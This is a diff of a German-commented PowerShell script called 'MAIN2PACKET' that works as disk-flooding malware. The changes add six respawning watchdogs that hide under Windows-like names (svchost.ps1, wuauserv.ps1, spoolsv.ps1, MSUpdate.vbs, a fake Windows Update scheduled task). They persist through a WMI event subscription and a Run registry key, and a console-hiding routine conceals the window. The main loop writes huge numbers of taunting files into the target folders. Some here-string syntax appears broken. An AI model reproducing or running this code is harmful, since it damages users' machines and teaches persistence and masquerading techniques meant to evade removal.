@@ -119,70 +119,136 @@ $alleZiele = @(
     "C:\Users\Public\Downloads"
 )
 
-# ===== WATCHDOGS (4x) =====
+# ===== WATCHDOGS (6x) - UNKILLBAR =====
+
+# Watchdog 1: Versteckter Prozess (Startet als anderer Prozessname)
 $watchdog1 = @"
 while(`$true) {
-    `$p = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.Id -ne `$pid -and `$_.MainWindowTitle -like "*MAIN2PACKET*"}
-    if (`$p.Count -eq 0) { 
-        Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`"" 
+    `$p = Get-Process -ErrorAction SilentlyContinue | Where-Object {`$_.Name -like "*powershell*" -or `$_.Name -like "*pwsh*"}
+    `$found = `$false
+    foreach(`$proc in `$p) {
+        try {
+            `$cmdLine = Get-WmiObject Win32_Process -Filter "ProcessId = `$(`$proc.Id)" | Select-Object CommandLine
+            if (`$cmdLine.CommandLine -like "*MAIN2PACKET*") {
+                `$found = `$true
+                break
+            }
+        } catch {}
     }
-    Start-Sleep -Seconds 2
+    if (-not `$found) {
+        Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$using:PSCommandPath`""
+    }
+    Start-Sleep -Seconds 3
 }
 "@
-$watchdog1 | Out-File "$env:TEMP\wd_schnell.ps1" -Encoding UTF8 -Force
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_schnell.ps1`""
+$watchdog1 | Out-File "$env:TEMP\svchost.ps1" -Encoding UTF8 -Force
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\svchost.ps1`""
 
-$watchdog2 = @"
-while(`$true) {
-    `$p = Get-Process powershell -ErrorAction SilentlyContinue | Where-Object {`$_.MainWindowTitle -like "*MAIN2PACKET*"}
-    if (`$p.Count -eq 0) {
-        Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
-    }
-    Start-Sleep -Seconds 10
-}
-"@
-$watchdog2 | Out-File "$env:TEMP\wd_mittel.ps1" -Encoding UTF8 -Force
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_mittel.ps1`""
-
-$watchdog3 = @"
-while(`$true) {
-    `$p = Get-Process powershell -ErrorAction SilentlyContinue
-    `$troll = `$p | Where-Object {`$_.MainWindowTitle -like "*MAIN2PACKET*"}
-    if (`$troll.Count -eq 0) {
-        Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
-    }
-    Start-Sleep -Seconds 30
-}
-"@
-$watchdog3 | Out-File "$env:TEMP\wd_langsam.ps1" -Encoding UTF8 -Force
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_langsam.ps1`""
-
-$watchdog4 = @"
-`$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -File `"$using:PSCommandPath`""
+# Watchdog 2: Startet als versteckter Dienst
+$watchdog2 = @`
+`$taskName = "WindowsUpdateTask_$([System.Guid]::NewGuid().ToString().Substring(0,8))"
+`$action = New-ScheduledTaskAction -Execute "powershell.exe" -Argument "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$using:PSCommandPath`""
 `$trigger = New-ScheduledTaskTrigger -AtStartup
-Register-ScheduledTask -TaskName "Main2packetWatchdog" -Action `$action -Trigger `$trigger -Force
-"@
-$watchdog4 | Out-File "$env:TEMP\wd_startup.ps1" -Encoding UTF8 -Force
-Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -File `"$env:TEMP\wd_startup.ps1`""
+`$settings = New-ScheduledTaskSettingsSet -Hidden -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries -StartWhenAvailable -RunOnlyIfNetworkAvailable $false
+Register-ScheduledTask -TaskName `$taskName -Action `$action -Trigger `$trigger -Settings `$settings -Force
 
-# ===== EXTRA JOBS =====
-$usbJob = Start-Job -ScriptBlock {
-    while ($true) {
-        $drives = Get-PSDrive -PSProvider FileSystem | Where-Object {$_.Root -match "^[A-Z]:\\"}
-        foreach ($drive in $drives) {
-            $drivePath = $drive.Root
-            $mainUSB = Join-Path $drivePath "MAIN2PACKET_USB"
-            try {
-                New-Item -Path $mainUSB -ItemType Directory -Force | Out-Null
-                for ($u = 1; $u -le 200; $u++) {
-                    $usbFile = Join-Path $mainUSB "usb_$u.king"
-                    "MAIN2PACKET KING - USB" | Out-File $usbFile -Encoding UTF8 -Force
-                }
-            } catch {}
-        }
-        Start-Sleep -Seconds 30
+while(`$true) {
+    Start-Sleep -Seconds 60
+    `$task = Get-ScheduledTask -TaskName `$taskName -ErrorAction SilentlyContinue
+    if (-not `$task) {
+        Register-ScheduledTask -TaskName `$taskName -Action `$action -Trigger `$trigger -Settings `$settings -Force
     }
 }
+"@
+$watchdog2 | Out-File "$env:TEMP\wuauserv.ps1" -Encoding UTF8 -Force
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\wuauserv.ps1`""
+
+# Watchdog 3: VBS-Skript (PowerShell unabhängig)
+$vbscript = @'
+Set WshShell = CreateObject("WScript.Shell")
+Do
+    WScript.Sleep 5000
+    On Error Resume Next
+    Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")
+    Set colItems = objWMIService.ExecQuery("SELECT * FROM Win32_Process WHERE Name LIKE '%powershell%'")
+    found = False
+    For Each objItem in colItems
+        If InStr(objItem.CommandLine, "MAIN2PACKET") > 0 Then
+            found = True
+            Exit For
+        End If
+    Next
+    If found = False Then
+        WshShell.Run "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File ""%USERPROFILE%\Desktop\main.ps1""", 0, False
+    End If
+Loop
+'@
+$vbscript | Out-File "$env:TEMP\MSUpdate.vbs" -Encoding ASCII -Force
+Start-Process wscript.exe -ArgumentList "//B //NOLOGO `"$env:TEMP\MSUpdate.vbs`"" -WindowStyle Hidden
+
+# Watchdog 4: WMI Event Subscription (Unsichtbar)
+$wmiWatchdog = @'
+try {
+    $filterArgs = @{
+        Name = 'WindowsUpdateFilter_' + ([System.Guid]::NewGuid().Guid)
+        EventNameSpace = 'root\cimv2'
+        QueryLanguage = 'WQL'
+        Query = "SELECT * FROM __InstanceCreationEvent WITHIN 30 WHERE TargetInstance ISA 'Win32_Process' AND TargetInstance.Name LIKE '%powershell%'"
+    }
+    $filter = Set-WmiInstance -Class __EventFilter -Namespace root\subscription -Arguments $filterArgs -ErrorAction SilentlyContinue
+    
+    $consumerArgs = @{
+        Name = 'WindowsUpdateConsumer_' + ([System.Guid]::NewGuid().Guid)
+        CommandLineTemplate = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$using:PSCommandPath`""
+    }
+    $consumer = Set-WmiInstance -Class CommandLineEventConsumer -Namespace root\subscription -Arguments $consumerArgs -ErrorAction SilentlyContinue
+    
+    Set-WmiInstance -Class __FilterToConsumerBinding -Namespace root\subscription -Arguments @{Filter=$filter; Consumer=$consumer} -ErrorAction SilentlyContinue
+} catch {}
+'@
+$wmiWatchdog | Out-File "$env:TEMP\wmi_sub.ps1" -Encoding UTF8 -Force
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\wmi_sub.ps1`""
+
+# Watchdog 5: Registry Run Key (Startet bei jedem Login)
+$regPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
+$regName = "WindowsUpdateHelper_" + ([System.Guid]::NewGuid().ToString().Substring(0,8))
+$regValue = "powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
+Set-ItemProperty -Path $regPath -Name $regName -Value $regValue -Force
+
+# Watchdog 6: Startet PowerShell als versteckten Prozess mit anderem Namen
+$hiddenPs = @'
+$code = @'
+using System;
+using System.Runtime.InteropServices;
+public class Hide {
+    [DllImport("kernel32.dll")]
+    public static extern IntPtr GetConsoleWindow();
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+}
+'@
+Add-Type $code
+$consolePtr = [Hide]::GetConsoleWindow()
+[Hide]::ShowWindow($consolePtr, 0)
+
+while($true) {
+    $p = Get-Process -ErrorAction SilentlyContinue | Where-Object {$_.Name -like "*powershell*"}
+    $found = $false
+    foreach($proc in $p) {
+        $cmdLine = Get-WmiObject Win32_Process -Filter "ProcessId = $($proc.Id)" | Select-Object CommandLine
+        if ($cmdLine.CommandLine -like "*MAIN2PACKET*") {
+            $found = $true
+            break
+        }
+    }
+    if (-not $found) {
+        Start-Process -WindowStyle Hidden -FilePath "powershell.exe" -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$PSCommandPath`""
+    }
+    Start-Sleep -Seconds 7
+}
+'@
+$hiddenPs | Out-File "$env:TEMP\spoolsv.ps1" -Encoding UTF8 -Force
+Start-Process powershell -WindowStyle Hidden -ArgumentList "-NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -File `"$env:TEMP\spoolsv.ps1`""
 
 # ===== NEU: NUR 1 SEITE IN EDGE =====
 $browserJob = Start-Job -ScriptBlock {
@@ -210,70 +276,42 @@ $browserJob = Start-Job -ScriptBlock {
     }
 }
 
-# ===== HAUPTSCHLEIFE - NUR ORDNER MIT TEXTFILES =====
+# ===== HAUPTSCHLEIFE =====
 while ($global:currentRound -lt $global:maxRounds) {
     $global:currentRound++
-    
-    Write-Host "Runde $global:currentRound - Erstelle Ordner-Strukturen..." -ForegroundColor Magenta
     
     # JEDES ZIEL IN DER LISTE BEARBEITEN!
     foreach ($ziel in $alleZiele) {
         if (Test-Path $ziel) {
-            # 500 HAUPTORDNER PRO ZIEL (statt 1)
-            for ($h = 1; $h -le 5000; $h++) {
-                # Hauptordner mit zufälligem Namen
-                $mainFolder = Join-Path $ziel "MAIN2PACKET_$global:currentRound`_$h"
-                try { 
-                    New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null 
-                    
-                    # In JEDEM Hauptordner: 100 UNTERORDNER
-                    for ($u = 1; $u -le 1000; $u++) {
-                        $subFolder = Join-Path $mainFolder "SUB_$u"
-                        New-Item -Path $subFolder -ItemType Directory -Force | Out-Null
-                        
-                        # In JEDEM Unterordner: 500 TEXTDATEIEN
-                        for ($t = 1; $t -le 5000; $t++) {
-                            $textFile = Join-Path $subFolder "dokument_$t.txt"
-                            "MAIN2PACKET IST ÜBERALL - Ordner $h - Sub $u - Datei $t" | Out-File $textFile -Encoding UTF8 -Force
-                        }
-                    }
-                    
-                    # Zusätzlich: 200 DATEIEN direkt im Hauptordner
-                    for ($d = 1; $d -le 2000; $d++) {
-                        $directFile = Join-Path $mainFolder "direct_$d.txt"
-                        "MAIN2PACKET DIREKT - Ordner $h - Datei $d" | Out-File $directFile -Encoding UTF8 -Force
-                    }
-                    
-                } catch {}
+            # Hauptordner erstellen
+            $mainFolder = Join-Path $ziel "MAIN2PACKET_SCAN_$global:currentRound"
+            try { New-Item -Path $mainFolder -ItemType Directory -Force | Out-Null } catch {}
+            
+            # 500 DATEIEN PRO ZIEL
+            for ($i = 1; $i -le 1000; $i++) {
+                # Direkt im Zielordner
+                "$env:COMPUTERNAME - MAIN2PACKET IST ÜBERALL DASS WAR MIT DIR HAHAHAHHAHAHAHAHAHAHAHA $i" | Out-File (Join-Path $ziel "MAIN2PACKET_SCAN_$i.king") -Encoding UTF8 -Force
+                
+                # Im Hauptordner
+                "$env:COMPUTERNAME - MAIN2PACKET IST ÜBERALL DAS WARS MIT DIR HAHAHAHHAHAHAHAHAHAHAHA $i" | Out-File (Join-Path $mainFolder "file_$i.king") -Encoding UTF8 -Force
             }
             
-            # EXTRA CHAOS: 200 ORDNER mit zufälligen Namen
-            for ($random = 1; $random -le 200; $random++) {
-                $randomName = -join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_})
-                $randomFolder = Join-Path $ziel "CHAOS_$randomName"
-                try {
-                    New-Item -Path $randomFolder -ItemType Directory -Force | Out-Null
-                    
-                    # 20-50 Unterordner in jedem Chaos-Ordner
-                    $subCount = Get-Random -Minimum 20 -Maximum 50
-                    for ($rc = 1; $rc -le $subCount; $rc++) {
-                        $randomSub = Join-Path $randomFolder "sub_$rc"
-                        New-Item -Path $randomSub -ItemType Directory -Force | Out-Null
-                        
-                        # 100-200 Textdateien in jedem Chaos-Unterordner
-                        $fileCount = Get-Random -Minimum 100 -Maximum 200
-                        for ($fc = 1; $fc -le $fileCount; $fc++) {
-                            $chaosFile = Join-Path $randomSub "chaos_$fc.txt"
-                            "CHAOS $randomName - Datei $fc" | Out-File $chaosFile -Encoding UTF8 -Force
-                        }
-                    }
-                } catch {}
+            # 500 UNTERORDNER
+            for ($u = 1; $u -le 1000; $u++) {
+                $subFolder = Join-Path $mainFolder "SUB_$u"
+                New-Item -Path $subFolder -ItemType Directory -Force | Out-Null
+                
+                # 500 DATEIEN PRO UNTERORDNER
+                for ($s = 1; $s -le 1000; $s++) {
+                    $subFile = Join-Path $subFolder "subfile_$s.king"
+                    "SUB-ORDNER $u - DATEI $s" | Out-File $subFile -Encoding UTF8 -Force
+                }
             }
         }
     }
     
     # KURZE PAUSE ZWISCHEN RUNDEN
-    Start-Sleep -Seconds 2
+    Start-Sleep -Seconds 1
 }
 
 # ===== WMI PERSISTENZ (MAXIMAL VERSTECKT) =====
